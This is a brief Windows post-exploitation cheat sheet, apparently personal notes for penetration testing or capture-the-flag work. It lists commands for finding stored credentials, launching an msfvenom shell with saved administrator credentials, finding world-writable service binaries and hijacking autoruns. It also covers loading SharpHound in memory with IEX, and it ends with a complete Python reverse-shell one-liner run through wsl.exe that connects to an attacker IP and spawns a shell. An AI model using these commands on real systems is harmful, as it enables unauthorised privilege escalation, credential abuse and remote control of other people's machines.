# Windows Enumeration


| Command | Summary |
| ---------------------------- | ---------------------------- |
| ```dir <name of file> /s /p``` | Search the file system, recursively for the filename |
| ```whoami /priv``` | Gets the privileges for current user context |
| ```more < name_of_alternate_data_stream.txt``` | Returns the contents of the alternate data stream | 
| ```cmdkey /list``` | We may get lucky and find stored credentials |
| ```runas /savecred /user:DOM.LOCAL\Administrator "C:\Users\<user>\Documents\shell.exe"``` | If the user is storing creds, launch an msfvenom shell | 
| ```accesschk64.exe -wvu <file.exe>``` | This will check the files access writes |
| ```icacls.exe <filename.txt>``` | Does the same thing as accesschk64.exe but is native to OS |
| ```accesschk64.exe -uwcv Everyone *``` | Searches the file system for world-writeable service binaries |

| Check | Description |
| ---------------------------- | ---------------------------- |
| PowerShell IWR vs IEX | Be sure to remember IEX will run the script in memory, useful for loading SharpHound.ps1 remotely |
| What tokens are on machine | If there tokens on the machine, you may be able to switch into that user, and elevate privileges |
| Check for autoruns | These are programs that can run with elevated permissions. If they have execissive permssions (EVERYONE) you can replace the binary and elevate access |
| Check for Binary Path issues| See command above, its important that we can restart these services to affect them |

## Common Location for WSL.exe
```
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
```

## Python Reverse Shell with WSL.exe
```
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.19",12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```